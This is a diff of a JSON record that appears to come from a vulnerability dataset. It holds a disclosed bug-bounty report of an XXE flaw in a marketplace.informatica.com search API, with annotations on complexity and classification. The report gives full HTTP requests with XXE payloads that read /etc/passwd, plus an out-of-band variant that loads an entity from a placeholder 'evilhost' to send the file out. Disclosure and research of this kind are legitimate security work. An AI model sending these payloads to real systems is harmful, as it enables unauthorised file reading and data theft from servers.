@@ -1,45 +1,46 @@
 {
-    "reported_to": "Informatica",
-    "reported_by": "yarbabin ",
-    "title": "[marketplace.informatica.com] - XXE",
-    "content": "\nRequest:\nPOST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1\nHost: marketplace.informatica.com\nConnection: keep-alive\nContent-Length: 140\nAccept: */*\nX-J-Token: no-user\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\nOrigin: https://marketplace.informatica.com\nContent-Type: application/json\nReferer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\n{\"params\":{\"source\":\"marketplace\",\"rows\":5,\"offset\":0,\"queryParams\":{\"query\":\"lol\",\"fieldList\":\"[\\\"id\\\", \\\"title\\\"]\",\"sortBy\":\"relevance\"}}}\nBut, if we change content-type to application/xml and convert JSON to XML:\nPOST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1\nHost: marketplace.informatica.com\nConnection: keep-alive\nContent-Length: 350\nAccept: */*\nX-J-Token: no-user\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\nOrigin: https://marketplace.informatica.com\nReferer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\nContent-Type: application/xml;charset=UTF-8\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd1\" >]>\n<params>\n<offset>0</offset>\n<queryParams>\n<query>&xxe;</query>\n<sortBy>relevance</sortBy>\n<fieldList>[\"id\", \"title\"]</fieldList>\n</queryParams>\n<source>marketplace</source>\n<rows>5</rows>\n</params>\nI get response: JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory).\nThen, i try to get /etc/passwd with OOB vector:\nPOST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1\nHost: marketplace.informatica.com\nConnection: keep-alive\nContent-Length: 350\nAccept: */*\nX-J-Token: no-user\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\nOrigin: https://marketplace.informatica.com\nReferer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\nContent-Type: application/xml;charset=UTF-8\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE foo [\n<!ENTITY % b SYSTEM \"file:///etc/passwd\">\n<!ENTITY % asd SYSTEM \"http://evilhost/xx.html\"> %asd; %rrr;]>\n<params>\n<offset>0</offset>\n<queryParams>\n<query>&xxe;</query>\n<sortBy>relevance</sortBy>\n<fieldList>[\"id\", \"title\"]</fieldList>\n</queryParams>\n<source>marketplace</source>\n<rows>5</rows>\n</params>\nAnd I got it :)\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Informatica",
+  "reported_by": "yarbabin ",
+  "title": "[marketplace.informatica.com] - XXE",
+  "content": "\nRequest:\nPOST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1\nHost: marketplace.informatica.com\nConnection: keep-alive\nContent-Length: 140\nAccept: */*\nX-J-Token: no-user\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\nOrigin: https://marketplace.informatica.com\nContent-Type: application/json\nReferer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\n{\"params\":{\"source\":\"marketplace\",\"rows\":5,\"offset\":0,\"queryParams\":{\"query\":\"lol\",\"fieldList\":\"[\\\"id\\\", \\\"title\\\"]\",\"sortBy\":\"relevance\"}}}\nBut, if we change content-type to application/xml and convert JSON to XML:\nPOST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1\nHost: marketplace.informatica.com\nConnection: keep-alive\nContent-Length: 350\nAccept: */*\nX-J-Token: no-user\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\nOrigin: https://marketplace.informatica.com\nReferer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\nContent-Type: application/xml;charset=UTF-8\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd1\" >]>\n<params>\n<offset>0</offset>\n<queryParams>\n<query>&xxe;</query>\n<sortBy>relevance</sortBy>\n<fieldList>[\"id\", \"title\"]</fieldList>\n</queryParams>\n<source>marketplace</source>\n<rows>5</rows>\n</params>\nI get response: JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory).\nThen, i try to get /etc/passwd with OOB vector:\nPOST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1\nHost: marketplace.informatica.com\nConnection: keep-alive\nContent-Length: 350\nAccept: */*\nX-J-Token: no-user\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\nOrigin: https://marketplace.informatica.com\nReferer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\nContent-Type: application/xml;charset=UTF-8\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE foo [\n<!ENTITY % b SYSTEM \"file:///etc/passwd\">\n<!ENTITY % asd SYSTEM \"http://evilhost/xx.html\"> %asd; %rrr;]>\n<params>\n<offset>0</offset>\n<queryParams>\n<query>&xxe;</query>\n<sortBy>relevance</sortBy>\n<fieldList>[\"id\", \"title\"]</fieldList>\n</queryParams>\n<source>marketplace</source>\n<rows>5</rows>\n</params>\nAnd I got it :)\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1481288760,
+  "report_url": "https://hackerone.com/reports/106797",
+  "vuln_category": "API",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "steps": [
+    [
+      1,
+      "Change the Content-Type header from application/json to application/xml in the request to the target endpoint."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Command Injection - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1481288760,
-    "report_url": "https://hackerone.com/reports/106797",
-    "vuln_category": "API",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "steps": [
-        [
-            1,
-            "Change the Content-Type header from application/json to application/xml in the request to the target endpoint."
-        ],
-        [
-            2,
-            "Craft an XML payload with an external entity reference pointing to a sensitive file (e.g., /etc/passwd) and send it to the endpoint."
-        ]
-    ],
-    "vuln_description": "The vulnerability is an XML External Entity (XXE) injection in the marketplace.informatica.com API endpoint. By changing the Content-Type to XML and crafting a malicious XML payload with external entity references, an attacker can read arbitrary files from the server filesystem.",
-    "reason": "The attack requires understanding of XML parsing behavior and how to craft XXE payloads, but the components involved (Content-Type switching and basic XXE) are well-known and straightforward. The main complexity comes from needing to switch the request format from JSON to XML, which is a common technique for testing XXE vulnerabilities.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": true
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves XML External Entity (XXE) injection, which is not directly related to authentication or authorization (AuthN/AuthZ) bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions, actions, and resource IDs within the same application. XXE is a separate class of vulnerability that exploits XML parsing and does not fit into the AuthN/AuthZ testing framework outlined.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Craft an XML payload with an external entity reference pointing to a sensitive file (e.g., /etc/passwd) and send it to the endpoint."
+    ]
+  ],
+  "vuln_description": "The vulnerability is an XML External Entity (XXE) injection in the marketplace.informatica.com API endpoint. By changing the Content-Type to XML and crafting a malicious XML payload with external entity references, an attacker can read arbitrary files from the server filesystem.",
+  "reason": "The attack requires understanding of XML parsing behavior and how to craft XXE payloads, but the components involved (Content-Type switching and basic XXE) are well-known and straightforward. The main complexity comes from needing to switch the request format from JSON to XML, which is a common technique for testing XXE vulnerabilities.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "reasoning": "The XXE vulnerability was discovered by modifying the Content-Type header and injecting a basic XML external entity payload. The methodology's 'simple payload' testing would detect this since the attack uses a standard XXE payload (file:///etc/passwd) without custom filter bypasses. The error response (JAXBException) directly reveals the vulnerability in the same channel, and the parameter (XML body) is injectable via Content-Type switching, which falls under 'regular' parameter extraction if the application supports both JSON/XML endpoints.",
+    "is_simple_injection": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves XML External Entity (XXE) injection, which is a server-side vulnerability that allows an attacker to interfere with an application's processing of XML data. This is not directly related to authentication or authorization (AuthN/AuthZ) bypass, nor is it an Insecure Direct Object Reference (IDOR) issue. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by manipulating user sessions and resource IDs, which does not apply to XXE vulnerabilities.",
+    "is_detectable": false
+  }
 }
